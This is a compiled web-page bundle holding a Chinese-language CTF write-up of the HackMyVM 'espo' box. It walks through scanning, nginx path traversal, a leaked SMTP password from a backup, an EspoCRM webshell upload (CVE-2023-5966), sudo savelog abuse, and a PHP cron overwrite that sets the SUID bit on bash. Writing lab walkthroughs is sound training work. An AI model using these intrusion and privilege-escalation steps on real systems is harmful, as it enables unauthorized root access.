"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[2961],{99686:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>i,default:()=>p,frontMatter:()=>o,metadata:()=>r,toc:()=>c});var s=t(74848),a=t(28453);const o={sidebar_position:6,tags:["Easy","Linux","nginx","\u5b9a\u65f6\u4efb\u52a1"],title:"espo",description:"espo"},i="espo",r={id:"box/HackMyVM/espo",title:"espo",description:"espo",source:"@site/docs/box/HackMyVM/espo.md",sourceDirName:"box/HackMyVM",slug:"/box/HackMyVM/espo",permalink:"/docs/box/HackMyVM/espo",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"nginx",permalink:"/docs/tags/nginx"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"}],version:"current",sidebarPosition:6,frontMatter:{sidebar_position:6,tags:["Easy","Linux","nginx","\u5b9a\u65f6\u4efb\u52a1"],title:"espo",description:"espo"},sidebar:"boxSidebar",previous:{title:"Universe",permalink:"/docs/box/HackMyVM/Universe"},next:{title:"convert",permalink:"/docs/box/HackMyVM/convert"}},d={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"HTTP - 80",id:"http---80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data --&gt; mandie",id:"www-data----mandie",level:3},{value:"mandie --&gt; root (\u7b2c\u4e00\u79cd\u65b9\u5f0f)",id:"mandie----root-\u7b2c\u4e00\u79cd\u65b9\u5f0f",level:3},{value:"www-data --&gt; root(\u7b2c\u4e8c\u79cd\u65b9\u5f0f: \u76f4\u63a5\u63d0\u6743)",id:"www-data----root\u7b2c\u4e8c\u79cd\u65b9\u5f0f-\u76f4\u63a5\u63d0\u6743",level:3},{value:"www-data --&gt; mandie (\u6269\u5c55\u624b\u6bb5)",id:"www-data----mandie-\u6269\u5c55\u624b\u6bb5",level:3}];function l(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"espo",children:"espo"}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# nmap -sTCV -p- --min-rate 1000 192.168.0.102\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 02:43 EDT\nNmap scan report for 192.168.0.102 (192.168.0.102)\nHost is up (0.020s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)\n| ssh-hostkey: \n|   256 dd:83:da:cb:45:d3:a8:ea:c6:be:19:03:45:76:43:8c (ECDSA)\n|_  256 e5:5f:7f:25:aa:c0:18:04:c4:46:98:b3:5d:a5:2b:48 (ED25519)\n80/tcp open  http    nginx\n|_http-title: EspoCRM\n| http-robots.txt: 1 disallowed entry \n|_/\nMAC Address: 08:00:27:C8:C3:DB (Oracle VirtualBox virtual NIC)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 11.69 seconds\n"})}),"\n",(0,s.jsx)(n.h2,{id:"http---80",children:"HTTP - 80"}),"\n",(0,s.jsxs)(n.p,{children:[(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416153448.png",alt:""}),"\n\u627e\u4e86\u4e00\u5708, \u76f8\u5173\u7684\u6f0f\u6d1e\u90fd\u9700\u8981\u5148\u767b\u9646\u7f51\u7ad9\u624d\u53ef\u4ee5\u64cd\u4f5c"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# gobuster dir -u http://192.168.0.102/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.0.102/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              txt,php,html\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/index.php            (Status: 200) [Size: 2480]\n/admin                (Status: 301) [Size: 162] [--\x3e http://192.168.0.102/admin/]\n/portal               (Status: 301) [Size: 162] [--\x3e http://192.168.0.102/portal/]\n/install              (Status: 301) [Size: 162] [--\x3e http://192.168.0.102/install/]\n/client               (Status: 301) [Size: 162] [--\x3e http://192.168.0.102/client/]\n/api                  (Status: 301) [Size: 162] [--\x3e http://192.168.0.102/api/]\n/robots.txt           (Status: 200) [Size: 26]\nProgress: 882240 / 882244 (100.00%)\n===============================================================\nFinished\n===============================================================\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u770b\u4e86\u4e00\u5708\u4ec0\u4e48\u6f0f\u6d1e\u90fd\u6ca1\u6709\u53d1\u73b0, \u89c9\u5f97\u662f\u4e2d\u95f4\u4ef6\u76f8\u5173\u7684\u6f0f\u6d1e\u4f46\u662f\u6ca1\u6709\u4ec0\u4e48\u53d1\u73b0\u770b\u4e86 WP\u63d0\u793a\u540e\u53d1\u73b0\u662f nginx \u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# gobuster dir -u http://espo.hmv/admin../ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -x html,txt,php,bak,zip \n/admin                (Status: 301) [Size: 162] [--\x3e http://espo.hmv/admin../admin/]\n/_oldsite             (Status: 301) [Size: 162] [--\x3e http://espo.hmv/admin../_oldsite/]\n                                                                                                                                                               \n\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM]\n\u2514\u2500# gobuster dir -u http://espo.hmv/admin../_oldsite -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt,php,bak,zip \n/info                 (Status: 200) [Size: 540]\n/backup.zip           (Status: 200) [Size: 37975754]\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528\u5de5\u5177\u626b\u63cf\u4e4b\u540e\u53ef\u4ee5\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u4e2a\u5907\u4efd\u6587\u4ef6, \u5728\u5176\u4e2d\u53ef\u4ee5\u83b7\u53d6\u5230\u4e00\u4e2a\u8d26\u53f7\u5bc6\u7801"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(root\u327fkali)-[~/CTF/HackerMyVM/backup/data]\n\u2514\u2500# cat config.php \n<?php\n\n  'smtpUsername' => 'admin',\n  'smtpPassword' => '39Ue4kcVJ#YpaAV24CNmbWU',\n?>\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u641c\u5bfb\u4e4b\u540e\u53d1\u73b0\u4e00\u4e2a\u6f0f\u6d1e\u53ef\u4ee5\u5229\u7528 ",(0,s.jsx)(n.a,{href:"https://github.com/pedrojosenavasperez/cve-2023-5966/tree/main",children:"CVE-2023-5966"})," \u4ece\u6269\u5c55\u9009\u9879\u5904\u8fdb\u884c\u4e0a\u4f20\u6587\u4ef6, \u4e4b\u540e\u70b9\u51fb\u5b89\u88c5\u5c31\u4f1a\u5199\u5165\u4e00\u4e2a ",(0,s.jsx)(n.code,{children:"webshell.php"})," \u6587\u4ef6\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416154233.png",alt:""}),"\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416154210.png",alt:""}),"\n\u968f\u540e\u83b7\u53d6\u4e00\u4e2a\u53cd\u5411 Shell\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416154343.png",alt:""})]}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"www-data----mandie",children:"www-data --\x3e mandie"}),"\n",(0,s.jsxs)(n.p,{children:["\u67e5\u770b mandie \u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u53d1\u73b0\u4e00\u4e2a copyPics \u6587\u4ef6, \u5176\u4e2d\u7684\u4f5c\u7528\u662f\u5c06 ",(0,s.jsx)(n.code,{children:"/var/shared_medias"})," \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fdb\u884c\u5206\u7c7b\u5b58\u653e, \u8fd9\u56de\u6d89\u53ca\u5230\u547d\u4ee4\u6267\u884c\u7684\u95ee\u9898"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'(remote) www-data@espo:/home/mandie$ cat copyPics \n#!/bin/bash\n\nSOURCE_MEDIAS="/var/shared_medias"\nPICTURES_DIR="$HOME/pictures"\nVIDEOS_DIR="$HOME/videos"\n\n/usr/bin/find "$SOURCE_MEDIAS" ! -executable -exec /usr/bin/cp {} "$HOME" 2>/dev/null \\;\nmkdir -p "$PICTURES_DIR" "$VIDEOS_DIR"\n\ndeclare -A directory_mappings\ndirectory_mappings=( ["$PICTURES_DIR"]="jpeg jpg" ["$VIDEOS_DIR"]="mp4 avi" )\n\nfor dir in "${!directory_mappings[@]}"; do\n    for ext in ${directory_mappings[$dir]}; do\n        mv "$HOME"/*.$ext "$dir/" 2>/dev/null\n    done\ndone\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u4ee3\u7801\u4e2d\u53ef\u4ee5\u770b\u5230\u662f\u4f1a\u5c06 ",(0,s.jsx)(n.code,{children:"/var/shared_medias"})," \u4e0b\u7684\u6240\u6709\u975e\u6267\u884c\u6587\u4ef6\u79fb\u52a8\u5230 ",(0,s.jsx)(n.code,{children:"/home/mandie"})," \u76ee\u5f55\u4e0b\u7684, \u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u5c06 ",(0,s.jsx)(n.code,{children:"copyPics"})," \u6587\u4ef6\u590d\u5236\u5230 ",(0,s.jsx)(n.code,{children:"/var/shared_medias"})," \u4e4b\u540e\u6dfb\u52a0\u53cd\u5411 Shell \u547d\u4ee4\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416164859.png",alt:""}),"\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416164914.png",alt:""})]}),"\n",(0,s.jsx)(n.h3,{id:"mandie----root-\u7b2c\u4e00\u79cd\u65b9\u5f0f",children:"mandie --\x3e root (\u7b2c\u4e00\u79cd\u65b9\u5f0f)"}),"\n",(0,s.jsxs)(n.p,{children:["\u53d1\u73b0 mandie \u7528\u6237\u5177\u6709 SUDO \u6743\u9650, \u53ef\u4ee5\u6267\u884c\u4e00\u4e2a savelog \u7684 Shell \u811a\u672c, \u4f7f\u7528 GPT \u5206\u6790\u540e\u8ba4\u4e3a\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u811a\u672c\u6765\u751f\u6210 ",(0,s.jsx)(n.code,{children:"/root/root.txt"})," \u7684\u65e5\u5fd7\u6587\u4ef6"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"(remote) mandie@espo:/home/mandie$ sudo -l\nsudo: unable to resolve host espo: Name or service not known\nMatching Defaults entries for mandie on espo:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser mandie may run the following commands on espo:\n    (ALL : ALL) NOPASSWD: /usr/bin/savelog\n(remote) mandie@espo:/home/mandie$ file /usr/bin/savelog \n/usr/bin/savelog: POSIX shell script, ASCII text executable\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u5982\u4e0b\u64cd\u4f5c"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"(remote) mandie@espo:/home/mandie$ sudo -u root /usr/bin/savelog -r /tmp /root/root.txt\nsudo: unable to resolve host espo: Name or service not known\nRotated `/root/root.txt' at Tue Apr 16 02:05:07 PM CEST 2024.\n(remote) mandie@espo:/home/mandie$ ls -al /tmp/root.txt.0 \n-rwx------ 1 root root 33 Dec  4 15:42 /tmp/root.txt.0\n(remote) mandie@espo:/home/mandie$ sudo -u root /usr/bin/savelog -u mandie /tmp/root.txt.0 \nsudo: unable to resolve host espo: Name or service not known\nRotated `/tmp/root.txt.0' at Tue Apr 16 02:06:42 PM CEST 2024.\n(remote) mandie@espo:/home/mandie$ ls -al /tmp/root.txt.0 \n-rw-r--r-- 1 mandie root 0 Apr 16 14:06 /tmp/root.txt.0\n(remote) mandie@espo:/home/mandie$\n"})}),"\n",(0,s.jsx)(n.h3,{id:"www-data----root\u7b2c\u4e8c\u79cd\u65b9\u5f0f-\u76f4\u63a5\u63d0\u6743",children:"www-data --\x3e root(\u7b2c\u4e8c\u79cd\u65b9\u5f0f: \u76f4\u63a5\u63d0\u6743)"}),"\n",(0,s.jsxs)(n.p,{children:["\u4e0a\u4f20 pspy \u8fdb\u884c\u5206\u6790, \u53d1\u73b0\u6709\u4e00\u4e2a root \u8fdb\u7a0b\u5728\u6267\u884c ",(0,s.jsx)(n.code,{children:"cron.php"})," \u6587\u4ef6, \u5e76\u4e14\u8fd9\u4e2a php \u6587\u4ef6\u5c5e\u4e8e ",(0,s.jsx)(n.code,{children:"www-data"})," \u7528\u6237\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416160955.png",alt:""})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'(remote) www-data@espo:/var/www/html$ ls -al cron.php \n-rw-r--r-- 1 www-data www-data 1531 Dec  4 15:42 cron.php\n(remote) www-data@espo:/var/www/html$ cat cron.php \n<?php\ninclude "bootstrap.php";\n\nuse Espo\\Core\\{\n    Application,\n    ApplicationRunners\\Cron,\n};\n\n(new Application())->run(Cron::class);\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u6240\u4ee5\u6211\u76f4\u63a5\u91cd\u5199 ",(0,s.jsx)(n.code,{children:"cron.php"})," \u6587\u4ef6\u4fee\u6539 ",(0,s.jsx)(n.code,{children:"/bin/bash"})," \u7684\u6743\u9650"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"<?php\n\tsystem('chmod u+s /bin/bash');\n?>\n"})}),"\n",(0,s.jsx)(n.h3,{id:"www-data----mandie-\u6269\u5c55\u624b\u6bb5",children:"www-data --\x3e mandie (\u6269\u5c55\u624b\u6bb5)"}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsxs)(n.p,{children:["\u4ece ",(0,s.jsx)(n.a,{href:"https://medium.com/@mrwhitecap/hackmyvm-espo-c2bb7f8af751",children:"HackMyVm : Espo"})," \u5b66\u4e60\u5230\u7684\u624b\u6bb5\u5c5e\u5b9e\u957f\u89c1\u8bc6\u4e86"]}),"\n"]}),"\n",(0,s.jsxs)(n.p,{children:["\u4e4b\u524d\u53d1\u73b0\u7684\u811a\u672c\u6587\u4ef6\u4f5c\u7528\u662f\u5c06 ",(0,s.jsx)(n.code,{children:"/var/shared_meidas"})," \u4e0b\u7684\u975e\u6267\u884c\u6587\u4ef6\u590d\u5236\u5230 ",(0,s.jsx)(n.code,{children:"/home/mandie"})," \u4e0b, \u6240\u4ee5\u53ef\u4ee5\u5229\u7528 ",(0,s.jsx)(n.code,{children:".forward"})," \u6587\u4ef6\u6765\u8fdb\u884c\u64cd\u4f5c"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240416202843.png",alt:""})})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>r});var s=t(96540);const a={},o=s.createContext(a);function i(e){const n=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);